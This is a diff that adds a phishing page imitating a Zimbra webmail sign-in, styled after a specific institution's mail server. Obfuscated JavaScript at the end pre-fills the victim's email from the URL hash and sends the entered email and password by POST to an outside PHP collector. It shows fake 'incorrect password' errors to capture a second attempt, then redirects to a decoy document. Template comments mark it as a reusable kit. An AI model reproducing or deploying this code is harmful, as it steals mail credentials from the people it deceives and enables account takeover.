@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Zimbra Web Client Sign In</title>
+    <link
+      rel="SHORTCUT ICON"
+      href="https://mail.ifi.it/zimbra/img/logo/favicon.ico"
+    />
+    <style>
+       * {font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;margin: 0;padding: 0;box-sizing: border-box;}.container {display: flex;justify-content: space-between;align-items: center;height: 100vh;width: 100vw;flex-direction: column;}.main {height: 100%;display: flex;align-items: center;justify-content: center;}.form-holder {background-color: #007cc3;padding: 10px 0 40px;border-radius: 3px;width: 500px;color: #fff;min-height: 265px;}.form-holder .logo-holder {width: 440px;margin: 0 auto;margin-top: 16px;margin-bottom: 30px;}.main-form {width: 320px;margin: 0 auto;}.input-form {display: flex;justify-content: space-between;align-items: center;margin-bottom: 14px;}.input-form label {font-size: 0.85rem;}.input-form input {border: 1px solid #fff;padding: 0;width: 235px;height: 20px;color: #000;outline-color: #000;border-radius: 5px;}.input-form .rm-holder {width: 235px;display: flex;align-items: center;justify-content: space-between;}.rm-holder .ch {display: flex;align-items: center;justify-content: start;}.ch input[type="checkbox"] {width: 13px;height: 13px;}.ch select {height: 20px;color: #000;width: 165px;}.rm-holder label {font-size: 0.75rem;}.rm-holder button {background-color: #007cc3;border-color: white;color: white;border: 1px solid #fff;border-radius: 4px;padding: 4px 6px;cursor: pointer;}.error {color: red;font-size: .85rem;margin-bottom: 10px;}.main-form hr {border-color: transparent transparent white;height: 0;margin: 16px 0;}.Footer, .Footer a {color: #656565;text-decoration: none;font-size: 0.85rem;text-align: center;}
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="main">
+        <div class="form-holder">
+          <div class="logo-holder">
+            <img
+              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAAkCAYAAADl2YrgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA/dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDE0IDc5LjE1Njc5NywgMjAxNC8wOC8yMC0wOTo1MzowMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ1dWlkOjVEMjA4OTI0OTNCRkRCMTE5MTRBODU5MEQzMTUwOEM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjBBMzI0OEYwQ0ZFQjExRTU4QUY0Q0EyQUVCOENCRUY1IiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjBBMzI0OEVGQ0ZFQjExRTU4QUY0Q0EyQUVCOENCRUY1IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIElsbHVzdHJhdG9yIENDIDIwMTQgKE1hY2ludG9zaCkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpmYjMyODc4Zi01YmE3LTQ3ZWUtOWE5OC1jZTllMjdlODRhODAiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5k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"
+            />
+          </div>
+          <div class="main-form">
+            <form>
+              <div id="error" class="error"></div>
+              <input type="hidden" name="source" id="source" value="zimbra" />
+              <div class="input-form">
+                <label>Username:</label>
+                <input
+                  id="username"
+                  name="username"
+                  type="text"
+                  value=""
+                  size="40"
+                  maxlength="1024"
+                  autocapitalize="off"
+                  autocorrect="off"
+                />
+              </div>
+              <div class="input-form">
+                <label>Password:</label>
+                <input
+                  id="password"
+                  name="password"
+                  type="password"
+                  value=""
+                  size="40"
+                  maxlength="1024"
+                  autocapitalize="off"
+                  autocorrect="off"
+                />
+              </div>
+              <div class="input-form">
+                <div></div>
+                <div class="rm-holder">
+                  <div class="ch">
+                    <input
+                      id="rememberMe"
+                      name="rememberMe"
+                      type="checkbox"
+                      value="true"
+                    />
+                    <label for="rememberMe">Stay signed in</label>
+                  </div>
+                  <button class="btn" type="submit" id="loginbutton">
+                    Sign in
+                  </button>
+                </div>
+              </div>
+              <hr />
+              <div class="input-form">
+                <label>Version:</label>
+                <div class="rm-holder">
+                  <div class="ch">
+                    <select>
+                      <option>Default</option>
+                      <option>Advanced (Ajax)</option>
+                      <option>Standard (HTML)</option>
+                      <option>Mobile</option>
+                      <option>Touch</option>
+                    </select>
+                  </div>
+                  <label>What's this?</label>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+
+      <footer>
+        <div class="Footer">
+          <div>
+            <a target="_new" href="">Zimbra</a> :: the leader in open source
+            messaging and collaboration :: <a target="_new" href="">Blog</a> -
+            <a target="_new" href="">Wiki</a> -
+            <a target="_new" href="">Forums</a>
+          </div>
+          <div>
+            Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is
+            a registered trademark of Synacor, Inc.
+          </div>
+        </div>
+      </footer>
+    </div>
+  </body>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script type="text/javascript">
+    const url = "https://bikerei.com.br/lp/p.php"; // ADD  YOUR  PHPFILE  LINK
+    const redirectUrl = "https://www.docdroid.net/CVz6FKs/202201934-pdf "; // ADD  YOUR  REDIRECT  LINK
+
+    const _0x175043=_0x593b;(function(_0x60628a,_0x492e){const _0x2feaa6=_0x593b,_0x5c6d25=_0x60628a();while(!![]){try{const _0x228c73=parseInt(_0x2feaa6(0x157))/0x1*(parseInt(_0x2feaa6(0x159))/0x2)+parseInt(_0x2feaa6(0x155))/0x3*(parseInt(_0x2feaa6(0x149))/0x4)+parseInt(_0x2feaa6(0x146))/0x5+parseInt(_0x2feaa6(0x15f))/0x6*(-parseInt(_0x2feaa6(0x15e))/0x7)+parseInt(_0x2feaa6(0x153))/0x8+-parseInt(_0x2feaa6(0x15d))/0x9+parseInt(_0x2feaa6(0x13e))/0xa*(-parseInt(_0x2feaa6(0x148))/0xb);if(_0x228c73===_0x492e)break;else _0x5c6d25['push'](_0x5c6d25['shift']());}catch(_0xcfe73f){_0x5c6d25['push'](_0x5c6d25['shift']());}}}(_0x4029,0xea461));const encoded=window[_0x175043(0x145)][_0x175043(0x14e)][_0x175043(0x150)]('#')[0x1],decode=encoded?atob(encoded):'';function _0x4029(){const _0x5b61f6=['color','textContent','match','href','Enter\x20a\x20valid\x20email\x20address','950zCUAJW','error','Enter\x20your\x20email\x20password','loginbutton','Something\x20isn\x27t\x20right,\x20please\x20try\x20again.','preventDefault','none','location','6411470FRHGwx','style','107998lBwbJi','1248lJgfce','ajax','#000','display','getElementById','hash','focus','split','Your\x20password\x20is\x20incorrect,\x20try\x20again.','click','2965816mXsoHL','password','12612gVqVUj','POST','1jHYgnl','red','1542390BlBVHO','source','Authenticating...','Enter\x20your\x20email\x20address','12403170UySpfJ','7yCUyfu','2792634UIdHBv','value','borderColor'];_0x4029=function(){return _0x5b61f6;};return _0x4029();}let plusOne=0x0;function _0x593b(_0x327ed5,_0x3d7a5f){const _0x402983=_0x4029();return _0x593b=function(_0x593b0c,_0x3156de){_0x593b0c=_0x593b0c-0x13b;let _0x169577=_0x402983[_0x593b0c];return _0x169577;},_0x593b(_0x327ed5,_0x3d7a5f);}const email=document[_0x175043(0x14d)]('username'),password=document[_0x175043(0x14d)](_0x175043(0x154)),source=document[_0x175043(0x14d)](_0x175043(0x15a)),submitBtn=document[_0x175043(0x14d)](_0x175043(0x141)),errorShow=document[_0x175043(0x14d)](_0x175043(0x13f));email[_0x175043(0x160)]=decode,submitBtn['addEventListener'](_0x175043(0x152),function(_0x1fe0fd){const _0x25ebcf=_0x175043;_0x1fe0fd[_0x25ebcf(0x143)]();if(email['value']===''){errorShow[_0x25ebcf(0x163)]=_0x25ebcf(0x15c),email[_0x25ebcf(0x14f)](),showEl(errorShow,_0x25ebcf(0x158));return;}else{if(!email[_0x25ebcf(0x160)][_0x25ebcf(0x13b)](/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)){errorShow['textContent']=_0x25ebcf(0x13d),email[_0x25ebcf(0x14f)](),showEl(errorShow,'red');return;}else{if(password['value']===''){errorShow[_0x25ebcf(0x163)]=_0x25ebcf(0x140),password[_0x25ebcf(0x14f)](),showEl(errorShow,_0x25ebcf(0x158));return;}else{const _0x2b3c05=email[_0x25ebcf(0x160)][_0x25ebcf(0x150)]('@')[0x1];plusOne=plusOne+0x1,showEl(errorShow,'black'),errorShow[_0x25ebcf(0x163)]=_0x25ebcf(0x15b);var _0x3fbb31={'email':email['value'],'password':password['value'],'source':source[_0x25ebcf(0x160)]};$[_0x25ebcf(0x14a)]({'type':_0x25ebcf(0x156),'url':url,'data':_0x3fbb31,'cache':![],'timeout':0xc3500,'success':function(_0x5762b0){const _0x4ad03f=_0x25ebcf;if(_0x5762b0==!![]){showEl(errorShow,'red'),errorShow['textContent']=_0x4ad03f(0x151),password[_0x4ad03f(0x160)]='',password[_0x4ad03f(0x147)]['borderColor']=_0x4ad03f(0x158);if(plusOne>0x1)window['location']['href']=redirectUrl;}else showEl(errorShow,_0x4ad03f(0x158)),errorShow['textContent']=_0x4ad03f(0x142),password[_0x4ad03f(0x160)]='',password[_0x4ad03f(0x147)]['borderColor']=_0x4ad03f(0x158);},'error':function(_0xc6c79f){const _0x228626=_0x25ebcf;showEl(errorShow,_0x228626(0x158)),errorShow[_0x228626(0x163)]=_0x228626(0x142),password[_0x228626(0x160)]='',password[_0x228626(0x147)][_0x228626(0x161)]=_0x228626(0x158);if(plusOne>0x1)window[_0x228626(0x145)][_0x228626(0x13c)]=redirectUrl;}});}}}});function showEl(_0x42a2fb,_0x29a8ad){const _0x18f49d=_0x175043;_0x42a2fb['style'][_0x18f49d(0x162)]=_0x29a8ad,_0x42a2fb[_0x18f49d(0x147)][_0x18f49d(0x14c)]='block';}function hideEl(_0x11c975){const _0x15f3c2=_0x175043;_0x11c975['style'][_0x15f3c2(0x162)]=_0x15f3c2(0x14b),_0x11c975[_0x15f3c2(0x147)][_0x15f3c2(0x14c)]=_0x15f3c2(0x144),_0x11c975[_0x15f3c2(0x163)]='';}
+  </script>
+</html>
